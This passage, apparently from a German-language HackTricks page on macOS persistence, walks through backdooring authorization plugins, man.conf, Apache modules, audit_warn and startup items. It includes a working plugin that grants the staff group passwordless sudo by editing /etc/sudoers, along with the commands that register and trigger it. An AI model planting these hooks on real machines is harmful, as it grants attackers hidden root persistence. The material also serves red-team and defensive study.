auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Autorisierungs-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein und zusätzliche Konfigurationen vornehmen
- TCC bypass: ???

#### Speicherort

- `/Library/Security/SecurityAgentPlugins/`
- root erforderlich
- Außerdem muss die Authorization-Datenbank so konfiguriert werden, dass sie das Plugin verwendet

#### Beschreibung & Exploitation

Du kannst ein Authorization-Plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um die Persistenz aufrechtzuerhalten. Weitere Informationen zum Erstellen eines solchen Plugins findest du in den vorherigen Writeups (und sei vorsichtig: Ein schlecht geschriebenes Plugin kann dich aussperren, sodass du deinen Mac aus dem Recovery Mode bereinigen musst).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Verschiebe** das Bundle an den Speicherort, von dem es geladen werden soll:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Füge schließlich die **Regel** hinzu, um dieses Plugin zu laden:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Das **`evaluate-mechanisms`** teilt dem Autorisierungsframework mit, dass es **einen externen Mechanismus zur Autorisierung aufrufen muss**. Außerdem bewirkt **`privileged`**, dass dieser von root ausgeführt wird.

Löse es aus mit:
```bash
security authorize com.asdf.asdf
```
Und dann sollte die **staff group sudo**-Zugriff haben (lies `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein und der Benutzer muss man verwenden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root erforderlich
- **`/private/etc/man.conf`**: Immer wenn man verwendet wird

#### Description & Exploit

Die Config-Datei **`/private/etc/man.conf`** gibt das Binary/Script an, das beim Öffnen von man-Dokumentationsdateien verwendet wird. Daher könnte der Pfad zur ausführbaren Datei geändert werden, sodass jedes Mal, wenn der Benutzer man zum Lesen einer Dokumentation verwendet, ein backdoor ausgeführt wird.<sup>[[31]](#references)</sup>

Zum Beispiel in **`/private/etc/man.conf`** festlegen:
```
MANPAGER /tmp/view
```
Und erstelle dann `/tmp/view` als:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein und Apache muss laufen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd verfügt über keine entitlements

#### Ort

- **`/etc/apache2/httpd.conf`**
- Root erforderlich
- Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Du kannst in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen werden soll, indem du eine Zeile wie die folgende hinzufügst:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Auf diese Weise werden deine kompilierten Module von Apache geladen. Das Einzige ist, dass du sie entweder mit einem **gültigen Apple-Zertifikat signieren** oder ein **neues vertrauenswürdiges Zertifikat** zum System hinzufügen und sie damit **signieren** musst.

Dann könntest du, falls erforderlich, Folgendes ausführen, um sicherzustellen, dass der Server gestartet wird:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Codebeispiel für die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du musst jedoch root sein, auditd muss laufen und eine Warnung auslösen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/etc/security/audit_warn`**
- Root erforderlich
- **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest also deinen Payload darin hinzufügen.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Mit `sudo audit -n` kannst du eine Warnung erzwingen.

### Startelemente

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**

Das **StartupItem** ist ein Verzeichnis, das sich entweder innerhalb von `/Library/StartupItems/` oder `/System/Library/StartupItems/` befinden sollte. Sobald dieses Verzeichnis erstellt wurde, muss es zwei bestimmte Dateien enthalten:

1. Ein **rc script**: Ein Shell-Script, das beim Start ausgeführt wird.
2. Eine **plist-Datei**, die speziell `StartupParameters.plist` heißt und verschiedene Konfigurationseinstellungen enthält.

Stelle sicher, dass sowohl das rc script als auch die Datei `StartupParameters.plist` korrekt im Verzeichnis **StartupItem** abgelegt sind, damit der Startvorgang sie erkennen und verwenden kann.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente in meinem macOS nicht finden. Weitere Informationen finden Sie daher im Writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond** wurde von Apple eingeführt und ist ein Logging-Mechanismus, der unterentwickelt oder möglicherweise aufgegeben zu sein scheint, aber weiterhin zugänglich ist. Obwohl dieser obskure Dienst für einen Mac-Administrator keinen besonderen Nutzen bietet, könnte er als unauffällige Persistence-Methode für Threat Actors dienen und wahrscheinlich von den meisten macOS-Admins unbemerkt bleiben.<sup>[[34]](#references)</sup>

Für diejenigen, die von seiner Existenz wissen, ist das Erkennen einer bösartigen Verwendung von **emond** unkompliziert. Der LaunchDaemon des Systems für diesen Dienst sucht in einem einzelnen Verzeichnis nach auszuführenden Scripts. Zur Überprüfung kann der folgende Befehl verwendet werden:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Ort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root erforderlich
- **Trigger**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist **in macOS nicht mehr installiert**. Weitere Informationen findest du im Writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Das Installieren eines kext ist selbst als Root so kompliziert, dass dies ohne einen Exploit nicht als praktische Sandbox-Escape- oder Persistence-Technik betrachtet wird.

#### Ort

Um ein KEXT als Autostart-Element zu installieren, muss es **an einem der folgenden Orte installiert werden**:

- `/System/Library/Extensions`
- In das OS-X-Betriebssystem integrierte KEXT-Dateien.
- `/Library/Extensions`
- Von Drittanbieter-Software installierte KEXT-Dateien

Du kannst aktuell geladene kext-Dateien mit folgendem Befehl auflisten:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Weitere Informationen zu [**kernel extensions finden Sie in diesem Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Speicherort

- **`/usr/local/bin/amstoold`**
- Root erforderlich

#### Beschreibung & Exploitation

Anscheinend verwendete die `plist` aus `/System/Library/LaunchAgents/com.apple.amstoold.plist` dieses Binary und stellte dabei einen XPC service bereit ... das Problem war, dass das Binary nicht existierte. Daher konnte man dort etwas platzieren, und sobald der XPC service aufgerufen wurde, würde das eigene Binary aufgerufen werden.<sup>[[35]](#references)</sup>

Ich kann dies in meinem macOS nicht mehr finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Speicherort

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root erforderlich
- **Trigger**: Wenn der service ausgeführt wird (selten)

#### Beschreibung & Exploit

Anscheinend wird dieses Script nicht sehr häufig ausgeführt, und ich konnte es in meinem macOS nicht einmal finden. Wenn Sie also weitere Informationen möchten, sehen Sie sich das Writeup an.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dies funktioniert in modernen macOS-Versionen nicht**

Es ist ebenfalls möglich, hier **Befehle zu platzieren, die beim Start ausgeführt werden.** Beispiel einer regulären rc.common-Datei:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistenztechniken und -Tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Jenseits der guten alten LaunchAgents - 1 - Shell-Startdateien](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Jenseits der guten alten LaunchAgents - 18 - X11 und XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Jenseits der guten alten LaunchAgents - 21 - Erneut geöffnete Anwendungen](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Jenseits der guten alten LaunchAgents - 20 - Terminal-Einstellungen](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Jenseits der guten alten LaunchAgents - 13 - Audio-Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Jenseits der guten alten LaunchAgents - 12 - QuickLook-Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Jenseits der guten alten LaunchAgents - 22 - LoginHook und LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Jenseits der guten alten LaunchAgents - 4 - Cron-Jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Jenseits der guten alten LaunchAgents - 2 - iTerm2-Start](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Jenseits der guten alten LaunchAgents - 7 - xbar-Plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Jenseits der guten alten LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Jenseits der guten alten LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Jenseits der guten alten LaunchAgents - 3 - Login-Objekte](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Jenseits der guten alten LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Jenseits der guten alten LaunchAgents - 24 - Ordneraktionen](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Ordneraktionen für Persistenz unter macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Jenseits der guten alten LaunchAgents - 27 - Dock-Verknüpfungen](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Jenseits der guten alten LaunchAgents - 17 - Farbwähler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Jenseits der guten alten LaunchAgents - 26 - Finder-Sync-Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Persistenz von „Mac File Opener“ analysieren (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Jenseits der guten alten LaunchAgents - 16 - Bildschirmschoner](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zugriff sichern: Bildschirmschoner für macOS-Persistenz (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Jenseits der guten alten LaunchAgents - 11 - Spotlight-Importer](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Jenseits der guten alten LaunchAgents - 9 - Einstellungsbereich](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Jenseits der guten alten LaunchAgents - 19 - Periodische Skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Jenseits der guten alten LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Jenseits der guten alten LaunchAgents - 28 - Autorisierungs-Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Persistenter Diebstahl von Zugangsdaten mit Autorisierungs-Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Jenseits der guten alten LaunchAgents - 30 - Die man-Konfigurationsdatei - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Jenseits der guten alten LaunchAgents - 25 - Apache2-Module](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Jenseits der guten alten LaunchAgents - 31 - BSM-Audit-Framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Jenseits der guten alten LaunchAgents - 23 - emond, der Event-Monitor-Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Jenseits der guten alten LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Jenseits der guten alten LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
